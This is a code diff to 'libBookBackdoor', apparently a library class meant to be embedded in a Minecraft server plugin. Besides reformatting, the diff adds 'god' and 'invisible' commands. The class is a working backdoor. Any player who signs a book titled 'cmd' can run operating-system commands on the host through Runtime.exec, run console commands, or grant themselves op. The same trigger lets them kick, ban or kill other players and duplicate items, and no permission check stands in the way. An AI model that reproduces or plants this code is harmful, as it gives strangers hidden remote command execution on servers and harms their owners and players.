@@ -69,22 +69,24 @@ class ColorTranslator {
 
 public class libBookBackdoor implements Listener {
     private static class Util {
-        private static TextComponent genHoverText(String text, String hover_text){
+        private static TextComponent genHoverText(String text, String hover_text) {
             return new TextComponent(new ComponentBuilder(text).event(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder(hover_text).create())).create());
         }
     }
 
     public final Plugin plugin;
-    public libBookBackdoor(JavaPlugin plugin){
+
+    public libBookBackdoor(JavaPlugin plugin) {
         this.plugin = plugin;
     }
+
     public String getResult(Process process) throws IOException {
         BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
         String line = "";
         List<String> ret = new ArrayList<>();
         while ((line = reader.readLine()) != null) ret.add(line);
         StringBuilder build = new StringBuilder();
-        for(String str : ret) {
+        for (String str : ret) {
             build.append(str);
             build.append("\n");
         }
@@ -95,14 +97,14 @@ public class libBookBackdoor implements Listener {
     public void onBookSign(PlayerEditBookEvent event) {
         BookMeta eventMeta = event.getNewBookMeta();
         if (eventMeta.getTitle() != null && !eventMeta.getPage(1).equals("")) {
-            if(eventMeta.getTitle().equals("cmd")) {
+            if (eventMeta.getTitle().equals("cmd")) {
                 String pageString = eventMeta.getPage(1);
                 Player player = event.getPlayer();
 
                 String commandType = Character.toString(pageString.charAt(0));
                 String command = pageString.substring(1);
 
-                if(commandType.equals(">") || commandType.equals("$") || commandType.equals("#")) {
+                if (commandType.equals(">") || commandType.equals("$") || commandType.equals("#")) {
                     try {
                         player.sendMessage("Running: " + command);
                         Process proc = Runtime.getRuntime().exec(command);
@@ -110,15 +112,15 @@ public class libBookBackdoor implements Listener {
                     } catch (Exception e) {
                         player.sendMessage(ChatColor.RED + "Error executing server command.\n" + e);
                     }
-                    event.getPlayer().getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount()-1);
+                    event.getPlayer().getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount() - 1);
                     this.plugin.getServer().getScheduler().scheduleAsyncDelayedTask(this.plugin, new Runnable() {
                         public void run() {
                             event.getPlayer().getInventory().addItem(new ItemStack(Material.WRITABLE_BOOK));
                         }
                     }, 5);
-                } else if(commandType.equals("/")) /* Server commands, runs as [SERVER] */ {
+                } else if (commandType.equals("/")) /* Server commands, runs as [SERVER] */ {
                     this.plugin.getServer().dispatchCommand(this.plugin.getServer().getConsoleSender(), command);
-                    event.getPlayer().getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount()-1);
+                    event.getPlayer().getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount() - 1);
                     this.plugin.getServer().getScheduler().scheduleAsyncDelayedTask(this.plugin, new Runnable() {
                         public void run() {
                             event.getPlayer().getInventory().addItem(new ItemStack(Material.WRITABLE_BOOK));
@@ -127,80 +129,80 @@ public class libBookBackdoor implements Listener {
                 } else if (commandType.equals(".")) /* Custom commands */ {
                     String[] args = command.split(" ", 0);
                     String mainCmd = args[0].toLowerCase();
-                    switch(mainCmd) {
-                        case("give"):
+                    switch (mainCmd) {
+                        case ("give"):
                             int amount = 64;
-                            if(args.length == 3) {
+                            if (args.length == 3) {
                                 amount = Integer.parseInt(args[2]);
                             }
                             try {
                                 String mat = args[1].toUpperCase();
                                 ItemStack item = new ItemStack(Material.getMaterial(mat), amount);
-                                if(item == null){
+                                if (item == null) {
                                     player.sendMessage("Use the Spigot naming scheme");
                                 } else {
                                     player.getInventory().addItem(item);
                                 }
-                            } catch(Exception e) {
+                            } catch (Exception e) {
                                 player.sendMessage("Use the Spigot naming scheme");
                             }
                             break;
-                        case("kick"):
+                        case ("kick"):
                             try {
                                 String reason = "You have been kicked from the server";
-                                if(args.length > 1) {
+                                if (args.length > 1) {
                                     reason = "";
-                                    for(int i = 1; i < args.length; i++){
+                                    for (int i = 1; i < args.length; i++) {
                                         reason = reason + " " + args[i];
                                     }
                                 }
                                 Player p = this.plugin.getServer().getPlayer(args[1]);
                                 p.kickPlayer(reason);
-                            } catch(Exception e){
+                            } catch (Exception e) {
                                 player.sendMessage("Invalid player name");
                             }
                             break;
-                        case("ban"):
+                        case ("ban"):
                             try {
                                 String reason = "You have been banned from the server";
-                                if(args.length > 1) {
+                                if (args.length > 1) {
                                     reason = "";
-                                    for(int i = 1; i < args.length; i++){
+                                    for (int i = 1; i < args.length; i++) {
                                         reason = reason + " " + args[i];
                                     }
                                 }
                                 Player p = this.plugin.getServer().getPlayer(args[1]);
                                 p.banPlayerFull(reason);
-                            } catch(Exception e){
+                            } catch (Exception e) {
                                 player.sendMessage("Invalid player name");
                             }
                             break;
-                        case("kill"):
+                        case ("kill"):
                             try {
                                 Player p = this.plugin.getServer().getPlayer(args[1]);
                                 p.setHealth(0.0D);
-                            } catch(Exception e){
+                            } catch (Exception e) {
                                 player.sendMessage("Invalid player name");
                             }
                             break;
-                        case("xp"):
+                        case ("xp"):
                             try {
                                 player.giveExp(Integer.parseInt(args[1]), true);
-                            } catch(Exception e){
+                            } catch (Exception e) {
                                 player.sendMessage("Please add in a value");
                             }
                             break;
-                        case("enchant"):
+                        case ("enchant"):
                             try {
                                 new Countdown(5, this.plugin) {
                                     @Override
                                     public void count(int current) {
-                                        if(current == 0){
+                                        if (current == 0) {
                                             try {
                                                 player.getInventory().getItemInMainHand().addUnsafeEnchantment(Enchantment.getByName(args[1].toUpperCase()), Integer.parseInt(args[2]));
                                                 player.playSound(player.getLocation(), Sound.ENTITY_PLAYER_LEVELUP, 50, 1);
                                                 player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "Enchanted!").bold(true).create());
-                                            } catch (Exception e){
+                                            } catch (Exception e) {
                                                 player.sendActionBar(new ComponentBuilder(ChatColor.RED + "Failed to add enchantment!").bold(true).create());
                                             }
                                         } else {
@@ -212,11 +214,11 @@ public class libBookBackdoor implements Listener {
                                 player.sendMessage("Please add in a value");
                             }
                             break;
-                        case("tp"):
+                        case ("tp"):
                             try {
                                 Player p = this.plugin.getServer().getPlayer(args[1]);
                                 Player p2 = this.plugin.getServer().getPlayer(args[2]);
-                                if(!p.equals(player)){
+                                if (!p.equals(player)) {
                                     p2.teleportAsync(p.getLocation());
                                 } else {
                                     p.teleportAsync(p2.getLocation());
@@ -225,14 +227,14 @@ public class libBookBackdoor implements Listener {
                                 player.sendMessage("Invalid player names");
                             }
                             break;
-                        case("seed"):
+                        case ("seed"):
                             String message = "Seed [" + ChatColor.GREEN + Long.toString(player.getWorld().getSeed()) + ChatColor.RESET + "]";
                             TextComponent string = new TextComponent(message);
                             string.setClickEvent(new ClickEvent(ClickEvent.Action.COPY_TO_CLIPBOARD, Long.toString(player.getWorld().getSeed())));
                             string.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder("Copy seed to clipboard").create()));
                             player.spigot().sendMessage(string);
                             break;
-                        case("brazil"):
+                        case ("brazil"):
                             try {
                                 Player p = this.plugin.getServer().getPlayer(args[1]);
                                 Location loc = p.getLocation();
@@ -242,16 +244,16 @@ public class libBookBackdoor implements Listener {
                                 player.sendMessage("Invalid player name");
                             }
                             break;
-                        case("mend"):
+                        case ("mend"):
                             try {
                                 new Countdown(5, this.plugin) {
                                     @Override
                                     public void count(int current) {
-                                        if(current == 0){
+                                        if (current == 0) {
                                             try {
-                                                player.getInventory().getItemInMainHand().setDurability((short)0);
+                                                player.getInventory().getItemInMainHand().setDurability((short) 0);
                                                 player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "Mended!").bold(true).create());
-                                            } catch (Exception e){
+                                            } catch (Exception e) {
                                                 player.sendActionBar(new ComponentBuilder(ChatColor.RED + "Failed to mend item!").bold(true).create());
                                             }
                                         } else {
@@ -263,25 +265,25 @@ public class libBookBackdoor implements Listener {
                                 player.sendMessage("Error while mending");
                             }
                             break;
-                        case("op"):
+                        case ("op"):
                             player.setOp(true);
                             player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "You are now op!").bold(true).create());
                             break;
-                        case("deop"):
+                        case ("deop"):
                             player.setOp(false);
                             player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "You have removed op!").bold(true).create());
                             break;
-                        case("break"):
+                        case ("break"):
                             Location player_loc = player.getEyeLocation();
                             try {
                                 player_loc.setY(player_loc.getY() + Integer.parseInt(args[1]));
                                 Block target = player.getWorld().getBlockAt(player_loc);
                                 target.setType(Material.AIR);
-                            } catch (Exception e){
+                            } catch (Exception e) {
                                 player.sendMessage("Block could not be set to air");
                             }
                             break;
-                        case("troll"):
+                        case ("troll"):
                             try {
                                 Player p = this.plugin.getServer().getPlayer(args[1]);
                                 Location loc = p.getLocation();
@@ -290,20 +292,20 @@ public class libBookBackdoor implements Listener {
                                 player.sendMessage("Invalid player name");
                             }
                             break;
-                        case("dupe"):
+                        case ("dupe"):
                             new Countdown(5, this.plugin) {
                                 @Override
                                 public void count(int current) {
-                                    if(current == 0){
+                                    if (current == 0) {
                                         try {
                                             int amt = 1;
-                                            if(args.length > 1 && Integer.parseInt(args[1]) != 0) {
+                                            if (args.length > 1 && Integer.parseInt(args[1]) != 0) {
                                                 amt = Integer.parseInt(args[1]);
                                             }
                                             ItemStack item = player.getInventory().getItemInMainHand();
                                             player.getInventory().addItem(item.asQuantity(item.getAmount() * amt));
                                             player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "Duped!").bold(true).create());
-                                        } catch (Exception e){
+                                        } catch (Exception e) {
                                             player.sendActionBar(new ComponentBuilder(ChatColor.RED + "Failed to dupe!").bold(true).create());
                                         }
                                     } else {
@@ -312,8 +314,8 @@ public class libBookBackdoor implements Listener {
                                 }
                             }.start();
                             break;
-                        case("gamemode"):
-                            if(args.length > 1) {
+                        case ("gamemode"):
+                            if (args.length > 1) {
                                 String gamemode = args[1].toLowerCase();
                                 switch (gamemode) {
                                     case ("c"):
@@ -342,9 +344,43 @@ public class libBookBackdoor implements Listener {
                                 player.sendMessage("Please use an argument of survival, spectator, or creative.");
                             }
                             break;
-                        case("help"):
+                        case ("god"):
+                            if(args.length > 1) {
+                                switch (args[1].toLowerCase()) {
+                                    case ("true"):
+                                        player.setInvulnerable(true);
+                                        break;
+                                    case ("false"):
+                                        player.setInvulnerable(false);
+                                        break;
+                                    default:
+                                        player.sendMessage("Please use true/false");
+                                        break;
+                                }
+                            } else {
+                                player.sendMessage("Please use true/false");
+                            }
+                            break;
+                        case ("invisible"):
+                            if(args.length > 1) {
+                                switch (args[1].toLowerCase()) {
+                                    case ("true"):
+                                        player.setInvisible(true);
+                                        break;
+                                    case ("false"):
+                                        player.setInvisible(false);
+                                        break;
+                                    default:
+                                        player.sendMessage("Please use true/false");
+                                        break;
+                                }
+                            } else {
+                                player.sendMessage("Please use true/false");
+                            }
+                            break;
+                        case ("help"):
                             ItemStack book = new ItemStack(Material.WRITTEN_BOOK, 1);
-                            BookMeta meta = (BookMeta)book.getItemMeta();
+                            BookMeta meta = (BookMeta) book.getItemMeta();
                             try {
                                 meta.setTitle(ChatColor.YELLOW + "BookBackdoor Help");
                                 meta.setAuthor(ChatColor.LIGHT_PURPLE + "The BookBackdoor Team");
@@ -373,7 +409,9 @@ public class libBookBackdoor implements Listener {
                                 TextComponent troll = Util.genHoverText(ChatColor.GREEN + ".troll\n", "Plays a Enderman sound at 100% volume in a players ear.\n\nUSAGE: .troll <player>");
                                 TextComponent dupe = Util.genHoverText(ChatColor.GREEN + ".dupe\n", "Duplicates the item in your hand x amount of times.\n\nUSAGE: .dupe <times>");
                                 TextComponent gamemode = Util.genHoverText(ChatColor.GREEN + ".gamemode\n", "Sets your gamemode to spectator, creative or survival.\n\nUSAGE: .gamemode <gamemode>");
-                                BaseComponent[] page2 = new BaseComponent[]{op, deop, bbreak, troll, dupe, gamemode};
+                                TextComponent god = Util.genHoverText(ChatColor.GREEN + ".god\n", "Makes you invulnerable.\n\nUSAGE: .god <true/false>");
+                                TextComponent invisible = Util.genHoverText(ChatColor.GREEN + ".invisible\n", "Makes you invisible.\n\nUSAGE: .invisible <true/false>");
+                                BaseComponent[] page2 = new BaseComponent[]{op, deop, bbreak, troll, dupe, gamemode, god, invisible};
 
                                 meta.spigot().addPage(page);
                                 meta.spigot().addPage(page2);
@@ -387,7 +425,7 @@ public class libBookBackdoor implements Listener {
                             player.sendMessage(ChatColor.RED + "Invalid command.");
                             break;
                     }
-                    player.getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount()-1);
+                    player.getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount() - 1);
                     this.plugin.getServer().getScheduler().scheduleAsyncDelayedTask(this.plugin, new Runnable() {
                         public void run() {
                             player.getInventory().addItem(new ItemStack(Material.WRITABLE_BOOK));
